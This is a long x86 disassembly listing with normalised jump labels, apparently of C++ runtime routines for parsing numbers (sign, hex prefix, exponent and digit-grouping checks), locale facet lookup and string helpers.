push 0x0
push 0x2d
call sub_100087f2
add esp 0xc
mov ecx edi
mov bx ax
call sub_10007c7b
cmp ax bx
jne r-xdata
mov [ esi ] 0x2b
jmp r-xdata
neg eax
sbb eax eax
and eax 0xa
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x50 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov [ ebp - 0x58 ] 0x0
push edi
mov [ ebp - 0x49 ] 0x0
call sub_100080a1
pop ecx
pop ecx
test al al
je r-xdata
mov [ esi ] 0x2d
lea eax [ esi + 0x1 ]
mov ecx edi
mov [ ebp - 0x54 ] eax
call sub_10007d14
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov ecx edi
call sub_10007c7b
cmp ax [ ebp - 0x64 ]
jne r-xdata
mov [ ebp - 0x64 ] 0xa
cmp [ ebp - 0x50 ] 0xa
je r-xdata
mov ecx edi
mov [ ebp - 0x58 ] 0x1
call sub_10007d14
push [ ebp - 0x5c ]
push edi
call sub_100080a1
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
jae r-xdata
push [ ebp - 0x60 ]
mov ecx edi
call sub_10007c7b
movzx eax ax
push eax
call sub_10008687
mov esi [ ebp - 0x54 ]
push [ ebp - 0x64 ]
mov [ esi ] al
movsx eax al
push eax
push r--data
call sub_10024c40
add esp 0x14
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x50 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x64 ] eax
jmp r-xdata
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
push [ ebp - 0x60 ]
push 0x0
push 0x78
call sub_100087f2
add esp 0xc
mov ecx edi
mov bx ax
call sub_10007c7b
cmp ax bx
je r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea esi [ ebp - 0x44 ]
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
push 0x1
call sub_100079fe
push [ ebp - 0x5c ]
add esi 0x1f
push edi
mov [ ebp - 0x4 ] 0x1
xor ebx ebx
mov [ ebp - 0x70 ] esi
call sub_100080a1
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp - 0x50 ] 0x8
cmp [ ebp - 0x50 ] 0x0
je r-xdata
push [ ebp - 0x60 ]
push 0x0
push 0x58
call sub_100087f2
add esp 0xc
mov ecx edi
mov bx ax
call sub_10007c7b
cmp ax bx
jne r-xdata
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x54 ] eax
test ebx ebx
jbe r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x68 ] 0x0
je r-xdata
cmp esi [ ebp - 0x70 ]
jae r-xdata
cmp [ esi ] 0x30
je r-xdata
mov ecx edi
mov [ ebp - 0x50 ] 0x10
mov [ ebp - 0x58 ] 0x0
call sub_10007d14
jmp r-xdata
cmp [ ebp - 0x50 ] 0x10
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi ] 0x7f
je r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x0
jle r-xdata
mov ecx edi
call sub_10007c7b
cmp ax [ ebp - 0x68 ]
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
call sub_10007b0c
cmp [ eax ] 0x7f
je r-xdata
inc esi
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x49 ] 0x1
mov eax [ ebp - 0x54 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_10002020
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10002020
mov eax [ ebp - 0x50 ]
call sub_100282ef
retn
mov eax [ ebp - 0x54 ]
inc [ ebp - 0x54 ]
mov [ eax ] 0x30
jmp r-xdata
dec ebx
je r-xdata
mov [ ebp - 0x58 ] 0x0
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10007a24
inc ebx
mov ecx edi
call sub_10007d14
push [ ebp - 0x5c ]
push edi
call sub_100080a1
pop ecx
pop ecx
test al al
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
inc [ eax ]
jmp r-xdata
test ebx ebx
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov cl [ esi ]
cmp cl [ eax ]
jl r-xdata
mov esi eax
jmp r-xdata
sub_10007448
push 0x60
mov eax sub_1004c24d
call sub_1002826c
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x18 ]
push eax
mov [ ebp - 0x68 ] ebx
call sub_10007ea3
pop ecx
mov ecx eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x6c ] ecx
call sub_1000c088
and [ ebp - 0x4 ] 0x0
add edi 0x8
push edi
push 0x0
push 0x30
mov [ ebp - 0x64 ] edi
call sub_100087f2
add esp 0xc
push [ ebp - 0x58 ]
movzx eax ax
mov ecx esi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4a ] 0x0
call sub_100081f6
test al al
jne r-xdata
and [ ebp - 0x50 ] 0x0
and [ ebp - 0x60 ] 0x0
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x49 ] 0x0
jae r-xdata
push edi
push 0x0
push 0x2b
call sub_100087f2
add esp 0xc
mov ecx esi
mov di ax
call sub_10007c7b
cmp ax di
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
push [ ebp - 0x64 ]
push 0x0
push 0x2d
call sub_100087f2
add esp 0xc
mov ecx esi
mov di ax
call sub_10007c7b
cmp ax di
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
push [ ebp - 0x58 ]
push esi
call sub_100080a1
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov ebx [ ebp - 0x68 ]
mov [ ebx ] 0x2d
mov ecx esi
inc ebx
call sub_10007d14
push [ ebp - 0x58 ]
push esi
call sub_100080a1
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_10007c7b
cmp [ ebp - 0x54 ] ax
ja r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x6c ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov ecx esi
movzx edi ax
call sub_10007c7b
cmp ax di
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
call sub_10007c7b
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx [ ebp - 0x6c ]
mov eax [ ecx ]
call [ eax + 0x8 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
movzx edi ax
call sub_100079fe
push [ ebp - 0x58 ]
and [ ebp - 0x5c ] 0x0
push esi
mov [ ebp - 0x4 ] 0x1
call sub_100080a1
pop ecx
pop ecx
test al al
je r-xdata
push [ ebp - 0x58 ]
push esi
call sub_100080a1
pop ecx
pop ecx
test al al
jne r-xdata
jmp r-xdata
call sub_10024c18
mov eax [ eax ]
mov al [ eax ]
mov [ ebx ] al
mov ecx esi
inc ebx
call sub_10007d14
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
cmp [ ebp - 0x50 ] 0x24
jl r-xdata
cmp [ ebp - 0x14 ] 0x10
mov edi [ ebp - 0x28 ]
jae r-xdata
mov ecx esi
call sub_10007c7b
cmp [ ebp - 0x54 ] ax
ja r-xdata
mov ecx esi
call sub_10007c7b
cmp [ ebp - 0x54 ] ax
ja r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
push [ ebp - 0x58 ]
push esi
call sub_100080a1
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebx ] 0x30
inc ebx
mov ecx esi
call sub_10007c7b
cmp ax [ ebp - 0x54 ]
jne r-xdata
inc [ ebp - 0x60 ]
jmp r-xdata
cmp [ ebp - 0x4a ] 0x0
jne r-xdata
lea edi [ ebp - 0x28 ]
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10007b0c
cmp [ eax ] 0x0
je r-xdata
mov ecx esi
call sub_10007c7b
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_10007c7b
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
cmp [ ebp - 0x4a ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
push esi
call sub_100080a1
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_10007c7b
cmp ax [ ebp - 0x54 ]
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
jge r-xdata
mov ecx esi
call sub_10007c7b
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10007d14
push [ ebp - 0x58 ]
push esi
call sub_100080a1
pop ecx
pop ecx
test al al
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_10002020
jmp r-xdata
cmp [ ebp - 0x5c ] 0x0
jbe r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
test di di
je r-xdata
cmp [ ebp - 0x50 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
cmp [ ebp - 0x50 ] 0x24
jge r-xdata
mov ebx [ ebp - 0x68 ]
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x65
call sub_100087f2
add esp 0xc
mov ecx esi
mov di ax
call sub_10007c7b
cmp ax di
je r-xdata
dec [ ebp - 0x60 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10007d14
mov [ ebx ] 0x30
inc ebx
inc [ ebp - 0x60 ]
jmp r-xdata
cmp [ edi ] 0x7f
je r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10007b0c
cmp [ eax ] 0x0
jle r-xdata
mov ecx esi
call sub_10007c7b
cmp ax di
jne r-xdata
mov ecx esi
call sub_10007c7b
cmp ax [ ebp - 0x54 ]
jne r-xdata
inc [ ebp - 0x60 ]
jmp r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10007d14
mov ecx esi
call sub_10007c7b
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx ] 0x0
call sub_10002020
mov eax [ ebp - 0x60 ]
call sub_100282ef
retn
mov [ ebx ] 0x65
mov ecx esi
inc ebx
call sub_10007d14
push [ ebp - 0x58 ]
and [ ebp - 0x50 ] 0x0
mov ecx esi
mov [ ebp - 0x49 ] 0x0
call sub_100081f6
test al al
jne r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x45
call sub_100087f2
add esp 0xc
mov ecx esi
mov di ax
call sub_10007c7b
cmp ax di
jne r-xdata
dec [ ebp - 0x5c ]
je r-xdata
mov [ ebp - 0x4a ] 0x1
inc [ ebp - 0x5c ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10007a24
inc [ ebp - 0x5c ]
mov ecx esi
call sub_10007c7b
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
je r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10007b0c
cmp [ eax ] 0x7f
je r-xdata
push [ ebp - 0x58 ]
push esi
call sub_100080a1
pop ecx
pop ecx
test al al
je r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x2b
call sub_100087f2
add esp 0xc
mov ecx esi
mov di ax
call sub_10007c7b
cmp ax di
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10007b0c
mov cl [ edi ]
cmp cl [ eax ]
jne r-xdata
mov ecx esi
call sub_10007d14
push [ ebp - 0x58 ]
push esi
call sub_100080a1
pop ecx
pop ecx
test al al
jne r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10007b0c
inc [ eax ]
jmp r-xdata
push [ ebp - 0x58 ]
push esi
call sub_100080a1
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx esi
call sub_10007c7b
cmp ax [ ebp - 0x54 ]
jne r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x2d
call sub_100087f2
add esp 0xc
mov ecx esi
mov di ax
call sub_10007c7b
cmp ax di
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10007b0c
mov cl [ edi ]
cmp cl [ eax ]
jl r-xdata
mov [ ebp - 0x4a ] 0x1
mov ecx esi
call sub_10007c7b
cmp [ ebp - 0x54 ] ax
ja r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10007d14
push [ ebp - 0x58 ]
push esi
call sub_100080a1
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebx ] 0x2d
mov ecx esi
inc ebx
call sub_10007d14
mov edi eax
jmp r-xdata
mov ecx esi
call sub_10007c7b
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov [ ebx ] 0x30
inc ebx
jmp r-xdata
cmp [ ebp - 0x50 ] 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10007d14
mov ecx esi
call sub_10007c7b
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
sub_10007a24
push ebx
mov ebx [ esp + 0x8 ]
push edi
or eax 0xffffffff
mov edi ecx
sub eax [ edi + 0x14 ]
cmp eax ebx
ja r-xdata
test ebx ebx
jbe r-xdata
call sub_10022f44
mov eax edi
pop edi
pop ebx
retn 0x8
push esi
mov esi [ edi + 0x14 ]
push 0x0
add esi ebx
push esi
mov ecx edi
call sub_10001ed2
test al al
je r-xdata
pop esi
push [ esp + 0x14 ]
mov ecx edi
push ebx
push [ edi + 0x14 ]
call sub_10007ccc
push esi
mov ecx edi
call sub_10002004
sub_10007a72
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
call sub_10022f7c
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
call sub_10022f44
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
mov ebx [ esi + 0x14 ]
add ebx [ ebp + 0xc ]
push 0x0
push ebx
mov ecx esi
call sub_10001ed2
test al al
je r-xdata
pop ebx
mov eax [ esi + 0x18 ]
lea ecx [ esi + 0x4 ]
cmp eax 0x10
jb r-xdata
mov [ ebp + 0x8 ] ecx
mov edx [ ecx ]
mov [ ebp + 0x8 ] edx
jmp r-xdata
mov edx [ esi + 0x14 ]
sub edx edi
push edx
mov edx [ ebp + 0x8 ]
sub eax edi
sub eax [ ebp + 0xc ]
add edx edi
push edx
add ecx edi
add ecx [ ebp + 0xc ]
push eax
push ecx
call sub_10001cbd
add esp 0x10
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push edi
call sub_10007ccc
push ebx
mov ecx esi
call sub_10002004
mov ecx [ ecx ]
cmp eax 0x10
jb r-xdata
sub_10007b0c
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi [ esi + 0x14 ]
jbe r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
call sub_10024832
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + edi ]
pop edi
pop esi
retn 0x4
sub_10007b34
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_100016c7
test al al
je r-xdata
call sub_10022f44
pop edi
mov eax esi
pop esi
retn 0x8
push [ esp + 0x10 ]
mov ecx esi
push edi
push 0x0
call sub_100051ee
push edi
mov ecx esi
call sub_100016a9
sub_10007b71
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x8 ]
add edi 0x8
movzx eax [ esi ]
push edi
push 0x0
push eax
call sub_100087f2
movzx eax ax
add esp 0xc
push eax
lea ecx [ ebp + 0x10 ]
call sub_10007c55
dec [ ebp + 0x1c ]
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop edi
pop esi
sub_10007bbc
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x20 ] 0x0
je r-xdata
push esi
push edi
push [ ebp + 0x14 ]
lea eax [ esp + 0x1c ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_10007b71
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] ecx
je r-xdata
inc edi
dec ebx
jmp r-xdata
push 0x1
push [ ebp + 0x20 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x28 ]
push eax
push [ ebp + 0x8 ]
call sub_100070cf
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_10024c40
add esp 0xc
test eax eax
je r-xdata
sub_10007c55
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
push [ esp + 0x8 ]
call sub_1000534e
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov eax esi
pop esi
retn 0x4
sub_10007c8f
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_10001ed2
test al al
je r-xdata
call sub_10022f44
pop edi
mov eax esi
pop esi
retn 0x8
push [ esp + 0x10 ]
mov ecx esi
push edi
push 0x0
call sub_10007ccc
push edi
mov ecx esi
call sub_10002004
sub_10007ccc
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
add ecx eax
push ecx
call sub_10008670
add esp 0xc
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
mov dl [ ebp + 0x10 ]
mov [ ecx + eax ] dl
jmp r-xdata
sub_10007d14
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
pop esi
retn
call sub_1003f606
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_10007d3b
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
call sub_1003f123
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x6 ] ax
jmp r-xdata
mov ax [ esi + 0x6 ]
mov [ esi + 0x4 ] 0x1
pop esi
retn
sub_10007d69
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100080b8
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10007e06
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10008157
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10007ea3
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10008230
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10007f40
push 0x38
mov eax sub_1004bee7
call sub_1002826c
mov esi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ esi ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0xc ]
xor edx edx
mov [ ebp - 0x44 ] eax
test cx cx
je r-xdata
push 0x0
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
call sub_100079fe
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x40 ] 0xfffffffe
mov [ ebp - 0x38 ] 0x1
movzx eax cx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
mov eax [ ebp - 0x40 ]
call sub_100282ef
retn
movzx eax [ esi + edi * 2 ]
test ax ax
je r-xdata
inc edx
movzx eax [ esi + edx * 2 ]
test ax ax
jne r-xdata
inc [ ebp + 0x10 ]
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x0
je r-xdata
movzx ecx [ esi ]
cmp ax cx
jne r-xdata
add edi [ ebp - 0x38 ]
movzx eax [ esi + edi * 2 ]
cmp ax [ esi ]
je r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
movsx eax [ eax ]
add edi eax
jmp r-xdata
inc edi
movzx eax [ esi + edi * 2 ]
test ax ax
jne r-xdata
push 0x7f
pop ebx
cmp [ ebp - 0x38 ] ebx
jae r-xdata
test ax ax
je r-xdata
inc [ ebp - 0x34 ]
mov eax [ ebp - 0x34 ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ax cx
je r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov [ eax ] bl
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x40 ] eax
mov ebx [ ebp - 0x38 ]
push [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
call sub_100081f6
test al al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
push 0x7f
pop ebx
cmp [ ebp - 0x38 ] ebx
jae r-xdata
mov ecx [ ebp - 0x3c ]
call sub_10007c7b
cmp [ esi + edi * 2 ] ax
jne r-xdata
push [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
call sub_100081f6
test al al
jne r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov [ eax ] bl
jmp r-xdata
mov ebx [ ebp - 0x38 ]
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x3c ]
inc [ ebp - 0x38 ]
call sub_10007d14
or [ ebp - 0x40 ] 0xffffffff
jmp r-xdata
xor edi edi
mov [ ebp - 0x2d ] 0x0
mov [ ebp - 0x34 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
sub_100080b8
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x4
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
mov [ ebp - 0x4 ] 0x1
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_100082d3
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10008157
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x4
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
mov [ ebp - 0x4 ] 0x1
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_100082f4
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_100081f6
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x4 ] bl
jne r-xdata
mov esi [ esp + 0x10 ]
cmp [ esi + 0x4 ] bl
jne r-xdata
call sub_10007d3b
cmp [ edi ] ebx
